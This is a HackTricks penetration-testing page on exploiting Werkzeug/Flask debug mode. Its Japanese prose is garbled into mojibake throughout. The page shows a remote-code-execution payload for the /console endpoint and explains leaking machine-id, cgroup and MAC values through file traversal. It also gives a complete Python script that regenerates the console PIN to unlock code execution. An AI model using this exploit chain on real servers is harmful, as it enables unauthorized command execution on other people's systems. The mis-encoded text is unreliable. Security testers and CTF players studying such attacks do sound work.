# Werkzeug / Flask ãƒ‡ãƒãƒƒã‚°

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**è„†å¼±æ€§è©•ä¾¡ã¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãŸã‚ã®å³æ™‚åˆ©ç”¨å¯èƒ½ãªã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—**ã€‚ã©ã“ã‹ã‚‰ã§ã‚‚ãƒ•ãƒ«ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã€ãƒªã‚³ãƒ³ã‹ã‚‰ãƒ¬ãƒãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã¾ã§ã®20ä»¥ä¸Šã®ãƒ„ãƒ¼ãƒ«ã¨æ©Ÿèƒ½ã‚’å‚™ãˆã¦ã„ã¾ã™ã€‚ç§ãŸã¡ã¯ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’ç½®ãæ›ãˆã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ - ç§ãŸã¡ã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ„ãƒ¼ãƒ«ã€æ¤œå‡ºãƒ»ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’é–‹ç™ºã—ã¦ã€å½¼ã‚‰ãŒã‚ˆã‚Šæ·±ãæ˜ã‚Šä¸‹ã’ã€ã‚·ã‚§ãƒ«ã‚’ãƒãƒƒãƒ—ã—ã€æ¥½ã—ã‚€ãŸã‚ã®æ™‚é–“ã‚’å–ã‚Šæˆ»ã™ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚

{% embed url="https://pentest-tools.com/" %}

## ã‚³ãƒ³ã‚½ãƒ¼ãƒ« RCE

ãƒ‡ãƒãƒƒã‚°ãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªå ´åˆã€`/console`ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦RCEã‚’ç²å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã«ã¯ã€[ã“ã®ã‚ˆã†ãª](https://github.com/its-arun/Werkzeug-Debug-RCE)ã¾ãŸã¯metasploitã«ã‚ã‚‹ã„ãã¤ã‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚‚å­˜åœ¨ã—ã¾ã™ã€‚

## ãƒ”ãƒ³ä¿è­· - ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

å ´åˆã«ã‚ˆã£ã¦ã¯ã€**`/console`** ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒãƒ”ãƒ³ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚**ãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®è„†å¼±æ€§**ãŒã‚ã‚‹å ´åˆã€ãã®ãƒ”ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«å¿…è¦ãªã™ã¹ã¦ã®æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### Werkzeug ã‚³ãƒ³ã‚½ãƒ¼ãƒ« PIN ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

**æœ€åˆã®ãƒªãƒ³ã‚¯ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã—ã¾ã—ãŸã€‚**\
ã‚¢ãƒ—ãƒªã§ãƒ‡ãƒãƒƒã‚°ã‚¨ãƒ©ãƒ¼ãƒšãƒ¼ã‚¸ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€Werkzeugã®ã€Œã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãƒ­ãƒƒã‚¯ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¾ã™ã€‚
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
è„†å¼±ãªWerkzeugãƒ‡ãƒãƒƒã‚°ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã¯`vulnerable-site.com/console`ã®ãƒ‘ã‚¹ã§è¦‹ã¤ã‘ã‚‰ã‚Œã¾ã™ãŒã€ç§˜å¯†ã®PINç•ªå·ã§ãƒ­ãƒƒã‚¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

ã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚’ç”Ÿæˆã™ã‚‹ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’é€†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ä¸Šã®Werkzeugã®ãƒ‡ãƒãƒƒã‚°`__init__.py`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª¿ã¹ã¦ãã ã•ã„ã€‚ä¾‹ï¼š`python3.5/site-packages/werkzeug/debug/__init__.py`ã€‚PINãŒã©ã®ã‚ˆã†ã«ç”Ÿæˆã•ã‚Œã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€[**Werkzeugã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py)ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒç•°ãªã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã®ã§ã€**ãƒ•ã‚¡ã‚¤ãƒ«ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®è„†å¼±æ€§**ã‚’é€šã˜ã¦ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ãƒªãƒ¼ã‚¯ã™ã‚‹æ–¹ãŒè‰¯ã„ã§ã—ã‚‡ã†ã€‚

ã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãªå¤‰æ•°ï¼š
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** ã¯ã“ã®Flaskã‚’èµ·å‹•ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã™
* **`modname`** ã¯ flask.app ã§ã™
* `getattr(app, '__name__', getattr(app.__class__, '__name__'))` ã¯ **Flask** ã§ã™
* `getattr(mod, '__file__', None)` ã¯ flaskãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã® **`app.py`ã®çµ¶å¯¾ãƒ‘ã‚¹** ã§ã™ï¼ˆä¾‹ï¼š`/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚ã‚‚ã— `app.py` ãŒæ©Ÿèƒ½ã—ãªã‘ã‚Œã°ã€**`app.pyc`ã‚’è©¦ã—ã¦ãã ã•ã„**

#### `private_bits`

*   `uuid.getnode()` ã¯ **ç¾åœ¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹** ã§ã€`str(uuid.getnode())` ã¯MACã‚¢ãƒ‰ãƒ¬ã‚¹ã®10é€²æ•°è¡¨ç¾ã§ã™ã€‚

* **ã‚µãƒ¼ãƒãƒ¼ã®MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹**ã«ã¯ã€ã‚¢ãƒ—ãƒªã‚’æä¾›ã—ã¦ã„ã‚‹**ä½¿ç”¨ä¸­ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹**ãŒä½•ã‹ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆä¾‹ï¼š`ens3`ï¼‰ã€‚ä¸æ˜ãªå ´åˆã¯ã€ãƒ‡ãƒã‚¤ã‚¹IDã®ãŸã‚ã« **`/proc/net/arp`ã‚’ãƒªãƒ¼ã‚¯** ã—ã€ãã®å¾Œ **`/sys/class/net/<device id>/address`ã§** MACã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’**ãƒªãƒ¼ã‚¯**ã—ã¾ã™ã€‚

**16é€²æ•°ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰10é€²æ•°** è¡¨ç¾ã«å¤‰æ›ã™ã‚‹ã«ã¯ã€ä¾‹ãˆã°pythonã§ä»¥ä¸‹ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š

```python
# ã“ã‚Œã¯ 56:00:02:7a:23:ac ã§ã—ãŸ
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` ã¯ **`/etc/machine-id`** ã¾ãŸã¯ **`/proc/sys/kernel/random/boot_id`** ã®å€¤ã‚’ã€æœ€å¾Œã®ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ (`/`) ã®å¾Œã® **`/proc/self/cgroup`ã®æœ€åˆã®è¡Œ** ã¨çµåˆã—ã¾ã™ã€‚

<details>

<summary>get_machine_id() ã‚³ãƒ¼ãƒ‰</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

ã™ã¹ã¦ã®å¤‰æ•°ãŒæº–å‚™ã•ã‚ŒãŸã‚‰ã€Werkzeugã‚³ãƒ³ã‚½ãƒ¼ãƒ«PINã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã®exploitã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
**å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã®Werkzeugã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã¯ã€ãƒãƒƒã‚·ãƒ¥ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’sha1ã‹ã‚‰**md5ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„**ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**è„†å¼±æ€§è©•ä¾¡ã¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãŸã‚ã®å³æ™‚åˆ©ç”¨å¯èƒ½ãªã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—**ã€‚ã©ã“ã‹ã‚‰ã§ã‚‚ãƒ•ãƒ«ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ãƒªã‚³ãƒ³ã‹ã‚‰ãƒ¬ãƒãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã¾ã§ã€20ä»¥ä¸Šã®ãƒ„ãƒ¼ãƒ«ã¨æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ã€‚ç§ãŸã¡ã¯ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’ç½®ãæ›ãˆã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ - ã‚ˆã‚Šæ·±ãæ˜ã‚Šä¸‹ã’ã€ã‚·ã‚§ãƒ«ã‚’ãƒãƒƒãƒ—ã—ã€æ¥½ã—ã‚€ãŸã‚ã«å½¼ã‚‰ã«æ™‚é–“ã‚’è¿”ã™ãŸã‚ã«ã€ã‚«ã‚¹ã‚¿ãƒ ãƒ„ãƒ¼ãƒ«ã€æ¤œå‡ºãƒ»ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’é–‹ç™ºã—ã¦ã„ã¾ã™ã€‚

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„**ã€‚

</details>
